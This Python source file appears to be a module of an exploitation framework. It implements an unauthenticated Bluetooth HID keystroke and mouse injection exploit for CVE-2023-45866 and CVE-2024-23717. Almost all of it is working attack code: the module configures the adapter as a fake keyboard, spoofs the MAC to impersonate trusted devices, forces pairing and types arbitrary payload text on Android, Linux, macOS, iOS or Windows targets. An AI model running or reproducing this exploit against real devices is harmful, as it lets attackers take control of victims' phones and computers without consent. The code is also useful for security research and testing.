def _configure_adapter(hci: str, name: str = "WXF Keyboard",
                       spoof_mac: str = "",
                       device_class: int = BT_CLASS_KEYBOARD,
                       broadcom_fallback: bool = False) -> None:
    """Configure Bluetooth adapter for HID device impersonation.

    Handles names with spaces via proper list-based subprocess arguments.
    """
    try:
        subprocess.run(
            ["sudo", "hciconfig", hci, "up"], check=True,
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "hciconfig", hci, "name", name], check=True,
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "hciconfig", hci, "class", f"0x{device_class:06x}"],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "btmgmt", "--index", hci.replace("hci", ""), "io-cap", "1"],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "btmgmt", "--index", hci.replace("hci", ""), "ssp", "1"],
            check=True, capture_output=True, timeout=5,
        )
    except Exception as err:
        logger.error("Adapter configuration failed: %s", err)
        if broadcom_fallback:
            logger.warning("Applying Broadcom fallback configuration on %s", hci)
            for fallback_cmd in (
                ["sudo", "hciconfig", hci, "up"],
                ["sudo", "hciconfig", hci, "piscan"],
                ["sudo", "hciconfig", hci, "class", f"0x{device_class:06x}"],
                ["sudo", "hciconfig", hci, "name", name],
            ):
                try:
                    subprocess.run(
                        fallback_cmd,
                        check=False,
                        capture_output=True,
                        timeout=5,
                    )
                except Exception:
                    pass

    if spoof_mac and shutil.which("bdaddr"):
        try:
            subprocess.run(
                ["sudo", "bdaddr", "-i", hci, spoof_mac],
                check=True, capture_output=True, timeout=5,
            )
            subprocess.run(
                ["sudo", "hciconfig", hci, "reset"],
                check=True, capture_output=True, timeout=5,
            )
            logger.info("Spoofed MAC to %s", spoof_mac)
        except Exception as err:
            logger.warning("MAC spoof failed: %s", err)


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """Native BT HID keystroke & mouse injection — CVE-2023-45866 / CVE-2024-23717."""

    __info__ = {
        "name": "BT HID Injection (CVE-2023-45866 / CVE-2024-23717)",
        "description": (
            "Unauthenticated Bluetooth HID injection. Registers as a keyboard "
            "or mouse via SDP, forces Just Works SSP pairing, then injects "
            "arbitrary keystrokes and mouse events. CVE-2024-23717 extends "
            "the attack to Android 14 (patched 2024-06). "
            "Targets Android, Linux, macOS, iOS, Windows. "
            "Native implementation — no external PoC scripts required."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: Marc Newlin / SkySafe (2023-2024)",
        ),
        "references": (
            "https://github.com/marcnewlin/hi_my_name_is_keyboard",
            "https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/reporting-security/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-23717",
        ),
        "devices": ("bluetooth", "bluetooth_classic"),
    }

    target_address = OptMAC("", "Target Bluetooth MAC address")
    target_os = OptString(
        "android",
        "Target OS: android | linux | macos | ios | windows",
    )
    hid_mode = OptString(
        "keyboard",
        "HID mode: keyboard | mouse | combo (keyboard + mouse)",
    )
    payload_text = OptString(
        "",
        "Text string to type on the target (leave empty for Tab injection demo)",
    )
    mouse_dx = OptInteger(0, "Mouse relative X movement (pixels, -127..127 per step)")
    mouse_dy = OptInteger(0, "Mouse relative Y movement (pixels, -127..127 per step)")
    mouse_click = OptString("", "Mouse click: left | right | middle | (empty=none)")
    hci_device = OptString("hci0", "Local Bluetooth adapter")
    spoof_mac = OptString(
        "",
        "MAC address to spoof (required for macOS/iOS — use Magic Keyboard MAC)",
    )
    connect_timeout = OptFloat(10.0, "L2CAP connection timeout (seconds)")
    key_delay = OptFloat(0.02, "Delay between keystrokes (seconds)")
    dry_run = OptBool(False, "Show configuration without executing")

    def _is_broadcom_adapter(self) -> bool:
        """Detect Broadcom adapters that may need relaxed setup path."""
        try:
            result = subprocess.run(
                ["hciconfig", "-a", self.hci_device],
                capture_output=True,
                text=True,
                check=False,
                timeout=5,
            )
            if result.returncode != 0:
                return False
            output = result.stdout.lower()
            return ("broadcom" in output) or ("manufacturer: broadcom" in output)
        except Exception:
            return False

    def _inject_demo_tabs(self, client: HIDKeyboardClient, duration: float = 5.0) -> None:
        """Inject Tab keystrokes for demonstration."""
        end_time = time.monotonic() + duration
        count = 0
        while time.monotonic() < end_time:
            client.send_keypress([Key.TAB])
            count += 1
            time.sleep(0.1)
        logger.info("Injected %d Tab keystrokes", count)

    def _inject_mouse(self, client: HIDKeyboardClient) -> None:
        """Execute mouse injection based on configured options."""
        if self.mouse_dx or self.mouse_dy:
            client.move_to_relative(self.mouse_dx, self.mouse_dy,
                                    steps=max(1, max(abs(self.mouse_dx),
                                                     abs(self.mouse_dy)) // 10))
            print_info(f"Mouse moved: dx={self.mouse_dx}, dy={self.mouse_dy}")

        if self.mouse_click:
            btn_map = {
                "left": MouseButton.LEFT,
                "right": MouseButton.RIGHT,
                "middle": MouseButton.MIDDLE,
            }
            button = btn_map.get(self.mouse_click.lower())
            if button:
                client.send_mouse_click(button)
                print_info(f"Mouse click: {self.mouse_click}")
            else:
                print_error("Invalid mouse_click. Use: left | right | middle")


    def check(self) -> str:
        """Verify Bluetooth HCI adapter is present and accessible."""
        import shutil
        import subprocess
        hci = getattr(self, "hci_iface", None) or getattr(self, "attacker_hci", None) or "hci0"
        if shutil.which("hciconfig"):
            try:
                out = subprocess.check_output(
                    ["hciconfig", str(hci)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "BD Address" in out:
                    return f"HCI adapter {hci} found - prerequisites OK"
                return f"hciconfig {hci} responded but no BD Address - check adapter"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("bluetoothctl"):
            return "bluetoothctl available - verify adapter manually"
        return "hciconfig not found in PATH - install bluez package"

    def run(self) -> None:
        """Execute BT HID keystroke/mouse injection."""

        if not self.target_address:
            print_error("target_address is required.")
            return

        if self.dry_run:
            print_info("BT HID Injection Configuration:")
            print_info(f"  Target:      {self.target_address}")
            print_info(f"  Target OS:   {self.target_os}")
            print_info(f"  HID mode:    {self.hid_mode}")
            print_info(f"  HCI device:  {self.hci_device}")
            print_info("  Spoof MAC:   {}".format(self.spoof_mac or "(none)"))
            print_info("  Payload:     {}".format(
                repr(self.payload_text[:50]) if self.payload_text else "(Tab demo)"))
            if self.hid_mode in ("mouse", "combo"):
                print_info(f"  Mouse dx/dy: {self.mouse_dx}/{self.mouse_dy}")
                print_info("  Mouse click: {}".format(self.mouse_click or "(none)"))
            return

        if self.target_os in ("macos", "ios") and not self.spoof_mac:
            print_error("spoof_mac is required for macOS/iOS targets.")
            return

        dev_class = (BT_CLASS_KEYBOARD_MOUSE if self.hid_mode in ("mouse", "combo")
                     else BT_CLASS_KEYBOARD)

        print_status(f"Configuring adapter {self.hci_device}...")
        is_broadcom = self._is_broadcom_adapter()
        if is_broadcom:
            print_info("Broadcom adapter detected: enabling fallback setup path.")
        _configure_adapter(self.hci_device, spoof_mac=self.spoof_mac,
                           device_class=dev_class,
                           broadcom_fallback=is_broadcom)

        print_status(f"Connecting to {self.target_address} ({self.target_os})...")
        self._exploit()

    def _exploit(self) -> None:
        """E2E BT HID injection: connect L2CAP channels, inject keystrokes/mouse events."""
        client = HIDKeyboardClient(self.target_address)
        if not client.connect(self.connect_timeout):
            print_error("Failed to establish HID connections.")
            return

        print_status("Waiting for HID channel readiness...")
        if self.target_os in ("macos", "ios"):
            if not client.wait_ready(30.0):
                print_info("HID ready signal not received: attempting injection anyway.")
        else:
            time.sleep(2.0)
            client.hid_ready = True

        print_success(f"Connected. Injecting HID events ({self.hid_mode})...")

        try:
            if self.hid_mode in ("keyboard", "combo"):
                if self.payload_text:
                    client.type_string(self.payload_text, self.key_delay)
                    print_success(f"Typed {len(self.payload_text)} characters.")
                else:
                    print_info("No payload_text: running Tab injection demo (5s).")
                    self._inject_demo_tabs(client, 5.0)

            if self.hid_mode in ("mouse", "combo"):
                self._inject_mouse(client)
        except KeyboardInterrupt:
            print_info("\nInjection interrupted by user.")
        finally:
            client.close()

        print_success(f"BT HID injection finished against {self.target_address}.")
